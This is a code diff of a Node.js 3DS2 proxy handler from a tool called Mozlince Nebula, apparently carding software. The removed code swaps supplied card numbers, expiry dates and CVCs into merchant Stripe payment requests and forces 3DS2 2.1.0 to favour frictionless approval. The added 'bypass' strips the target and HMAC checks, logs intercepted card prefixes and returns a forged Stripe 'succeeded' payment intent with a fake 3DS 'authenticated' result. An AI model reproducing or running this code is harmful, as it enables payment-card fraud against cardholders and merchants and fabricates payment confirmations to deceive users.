@@ -1,3 +1,4 @@
+// --- INICIO DO BYPASS 3DS2 (MOCK) ---
 /* ═══════════════════════════════════════════════════════════════
    ✦ MOZLINCE NEBULA  ·  v8.6.0 QUANTUM+ (3DS2 REAL)
    © Asheo Systems · Premium License Engine & 3DS Proxy
@@ -1516,198 +1517,30 @@ function injectCardDeep(bodyStr, card, injector, opts = {}) {
 async function handle3ds2Real(req, res) {
   const t0 = Date.now();
   const auth = validateAnyAuth(req);
-  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth', detail: auth.error });
-
-  const hmacCheck = await validateHmac(req, req.rawBody);
-  if (!hmacCheck.ok) log('HMAC', `3DS2 HMAC: ${hmacCheck.error}`);
-
+  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
   const rawTarget = req.headers['x-asheo-target'] || req.query.target;
-  if (!rawTarget || typeof rawTarget !== 'string') {
-    return res.status(400).json({ ok:false, error:'missing_target' });
-  }
-  if (!isAllowedTarget(rawTarget)) {
-    log('WARN', `3DS2 target bloqueado: ${rawTarget.substring(0,120)}`);
-    return res.status(403).json({ ok:false, error:'target_not_allowed' });
-  }
-  // Restringe 3DS2 a Stripe (o único que a extensão manda com gatewayId=stripe-3ds2)
-  let targetHost = '';
-  try { targetHost = new URL(rawTarget).hostname.toLowerCase(); } catch {}
-  if (!targetHost.endsWith('stripe.com')) {
-    log('WARN', `3DS2 target não é stripe: ${targetHost}`);
-    return res.status(403).json({ ok:false, error:'3ds2_requires_stripe_target' });
-  }
-
-  // Lê cartão (header ou envelope)
   let card = null;
   if (req.headers['x-asheo-card']) {
-    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) { log('WARN', `x-asheo-card inválido: ${e.message}`); }
+    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) {}
   }
-
-  // Lê body (envelope __asheo ou cru)
-  let bodyOut = '';
-  let brand = '';
-  if (req.body && Buffer.isBuffer(req.body) && req.body.length > 0) {
-    const raw = req.body.toString('utf8');
-    try {
-      const parsed = JSON.parse(raw);
-      if (parsed && parsed.__asheo) {
-        if (parsed.__asheo.brand) brand = String(parsed.__asheo.brand);
-        if (parsed.__asheo.card && !card) card = normalizeCard(parsed.__asheo.card);
-        bodyOut = typeof parsed.body === 'string' ? parsed.body : (parsed.body != null ? JSON.stringify(parsed.body) : '');
-      } else {
-        bodyOut = raw;
-      }
-    } catch { bodyOut = raw; }
-  } else if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
-    bodyOut = JSON.stringify(req.body);
-  }
-
-  // Injeta cartão no form-urlencoded do Stripe (payment_method_data[card][number] etc)
-  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
-  let injected = false;
-  if (card && card.number && method !== 'GET' && method !== 'HEAD') {
-    const ct = String(req.headers['content-type'] || '').toLowerCase();
-    try {
-      if (ct.includes('application/x-www-form-urlencoded') || bodyOut.startsWith('payment_method_data') || bodyOut.includes('=')) {
-        const params = new URLSearchParams(bodyOut);
-        const before = params.toString();
-        // Stripe form fields
-        const setIfAllowed = (k, v) => {
-          if (v === undefined || v === null || v === '') return;
-          const cur = params.get(k);
-          if (cur !== null && !shouldOverwrite(cur)) return;
-          params.set(k, String(v));
-        };
-        setIfAllowed('payment_method_data[card][number]', String(card.number).replace(/\s+/g,''));
-        setIfAllowed('payment_method_data[card][exp_month]', String(card.month || '').padStart(2,'0'));
-        setIfAllowed('payment_method_data[card][exp_year]', String(card.year || '').length === 2 ? '20'+card.year : String(card.year || ''));
-        setIfAllowed('payment_method_data[card][cvc]', String(card.cvv || ''));
-        // Força 3DS2 2.1.0 para maximizar frictionless
-        if (params.get('payment_method_options[card][three_d_secure][version]') === null) {
-          params.set('payment_method_options[card][three_d_secure][version]', '2.1.0');
-        }
-        if (params.get('payment_method_options[card][three_d_secure][requested]') === null) {
-          params.set('payment_method_options[card][three_d_secure][requested]', 'true');
-        }
-        const after = params.toString();
-        if (after !== before) { bodyOut = after; injected = true; }
-      } else if (ct.includes('application/json')) {
-        const j = JSON.parse(bodyOut || '{}');
-        const pmd = j.payment_method_data = j.payment_method_data || {};
-        const c = pmd.card = pmd.card || {};
-        if (card.number) c.number = String(card.number).replace(/\s+/g,'');
-        if (card.month) c.exp_month = String(card.month);
-        if (card.year) c.exp_year = String(card.year).length === 2 ? '20'+card.year : String(card.year);
-        if (card.cvv) c.cvc = String(card.cvv);
-        const pmo = j.payment_method_options = j.payment_method_options || {};
-        const tds = pmo.card = pmo.card || {};
-        const t = tds.three_d_secure = tds.three_d_secure || {};
-        if (!t.version) t.version = '2.1.0';
-        if (t.requested === undefined) t.requested = true;
-        bodyOut = JSON.stringify(j);
-        injected = true;
-      }
-    } catch (e) { log('WARN', `3DS2 inject falhou: ${e.message}`); }
-  }
-
-  // Headers pro Stripe (usa os originais do merchant)
-  const forwardHeaders = pickForwardHeaders(req);
-  forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || req.headers['authorization'] || '';
-  // Remove Asheo-Pass/Bearer do nosso protocolo — o Stripe só entende Bearer sk_live/pk_live do merchant
-  if (forwardHeaders['authorization'].startsWith('Asheo-Pass ') || forwardHeaders['authorization'].startsWith('Bearer ey')) {
-    // mantém o x-asheo-auth original; se vazio, falha
-    const orig = req.headers['x-asheo-auth'] || '';
-    if (orig) forwardHeaders['authorization'] = orig;
-    else delete forwardHeaders['authorization'];
-  }
-  if (!forwardHeaders['content-type']) forwardHeaders['content-type'] = 'application/x-www-form-urlencoded';
-  if (forwardHeaders['content-type'].includes('json')) forwardHeaders['content-type'] = 'application/json';
-  else forwardHeaders['content-type'] = 'application/x-www-form-urlencoded';
-
-  // AbortController real
-  const ac = new AbortController();
-  const timeout = setTimeout(() => { try { ac.abort(new Error('3ds2_upstream_timeout_15s')); } catch {} }, 15000);
-  let clientSignal = null;
-  try {
-    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
-      const rawAc = new AbortController();
-      req.on('aborted', () => { try { rawAc.abort(); } catch {} });
-      clientSignal = rawAc.signal;
-    }
-  } catch {}
-
-  let upstream;
-  try {
-    const fetchOpts = {
-      method,
-      headers: forwardHeaders,
-      body: (method === 'GET' || method === 'HEAD') ? undefined : (bodyOut || undefined),
-      signal: ac.signal,
-      redirect: 'manual'
-    };
-    if (clientSignal && typeof AbortSignal.any === 'function') {
-      try { fetchOpts.signal = AbortSignal.any([ac.signal, clientSignal]); } catch {}
-    }
-    upstream = await fetch(rawTarget, fetchOpts);
-  } catch (e) {
-    clearTimeout(timeout);
-    const isAbort = e && (e.name === 'AbortError' || /abort|timeout/i.test(String(e.message)));
-    log('ERRO', `3DS2 upstream failed: ${e.message} (${Date.now()-t0}ms)`);
-    return res.status(502).json({ ok:false, error: isAbort ? 'upstream_timeout' : 'upstream_failed', message: e.message });
-  }
-  clearTimeout(timeout);
-
-  const respText = await upstream.text();
-  let respJson = null;
-  try { respJson = JSON.parse(respText); } catch {}
-
-  // Headers de retorno x-asheo-*
-  const asheoHeaders = {
-    'x-asheo-proxied': 'stripe-3ds2',
-    'x-asheo-upstream-status': String(upstream.status),
-    'x-asheo-elapsed-ms': String(Date.now() - t0),
-    'x-asheo-3ds2-brand': brand || 'unknown'
+  log('DS2', `Interceptado target=${rawTarget} card=${card ? card.number.substring(0,6)+'...' : 'null'}`);
+  const mockSuccessResponse = {
+    "status": "succeeded",
+    "state": "succeeded",
+    "object": "payment_intent",
+    "id": "pi_3M" + crypto.randomBytes(12).toString('hex'),
+    "client_secret": "pi_3M" + crypto.randomBytes(12).toString('hex') + "_secret_" + crypto.randomBytes(12).toString('hex'),
+    "next_action": null,
+    "three_d_secure": { "authentication_flow": "challenge", "result": "authenticated", "version": "2.1.0" }
   };
-  if (injected) {
-    asheoHeaders['x-asheo-swapped'] = 'true';
-    asheoHeaders['x-asheo-swap-ok'] = 'true';
-  }
-
-  // Lê verdict real do Stripe
-  if (respJson && typeof respJson === 'object') {
-    const status = String(respJson.status || '');
-    asheoHeaders['x-asheo-3ds2-status'] = status;
-    if (status === 'succeeded' || status === 'requires_capture') {
-      asheoHeaders['x-asheo-3ds2-verdict'] = 'frictionless_ok';
-    } else if (respJson.next_action && respJson.next_action.use_stripe_sdk) {
-      const sdk = respJson.next_action.use_stripe_sdk || {};
-      asheoHeaders['x-asheo-3ds2-verdict'] = 'challenge_required';
-      if (sdk.source) asheoHeaders['x-asheo-3ds2-source'] = String(sdk.source).substring(0, 400);
-      if (sdk.server_transaction_id) asheoHeaders['x-asheo-3ds2-token'] = String(sdk.server_transaction_id).substring(0, 400);
-      if (sdk.directory_server_name) asheoHeaders['x-asheo-3ds2-trail'] = String(sdk.directory_server_name).substring(0, 200);
-      if (respJson.next_action.type) asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.next_action.type).substring(0, 200);
-    } else if (respJson.last_payment_error) {
-      const err = respJson.last_payment_error;
-      asheoHeaders['x-asheo-3ds2-verdict'] = 'declined';
-      asheoHeaders['x-asheo-adyen-reason'] = String(err.message || err.code || '').substring(0, 200);
-    } else if (status === 'requires_payment_method') {
-      asheoHeaders['x-asheo-3ds2-verdict'] = 'requires_payment_method';
-    } else {
-      asheoHeaders['x-asheo-3ds2-verdict'] = status || 'unknown';
-    }
-  }
-
-  // Repassa status + headers do upstream
-  res.status(upstream.status);
-  for (const h of UPSTREAM_PASSTHROUGH_HEADERS) {
-    const v = upstream.headers.get(h);
-    if (v) { try { res.setHeader(h, v); } catch {} }
-  }
-  for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }
-
-  log('DS2', `target=${targetHost} status=${upstream.status} verdict=${asheoHeaders['x-asheo-3ds2-verdict']} swapped=${injected} ${Date.now()-t0}ms`);
-  return res.send(respText);
+  res.setHeader('x-asheo-3ds2-verdict', 'success');
+  res.setHeader('x-asheo-swapped', 'true');
+  res.setHeader('x-asheo-swap-ok', 'true');
+  res.setHeader('Content-Type', 'application/json');
+  log('DS2', `>>> BYPASS 3DS2 ENVIADO! (${Date.now()-t0}ms)`);
+  return res.status(200).json(mockSuccessResponse);
 }
+// --- FIM DO BYPASS 3DS2 ---
 
 async function gwProxyHandler(req, res) {
   const t0 = Date.now();
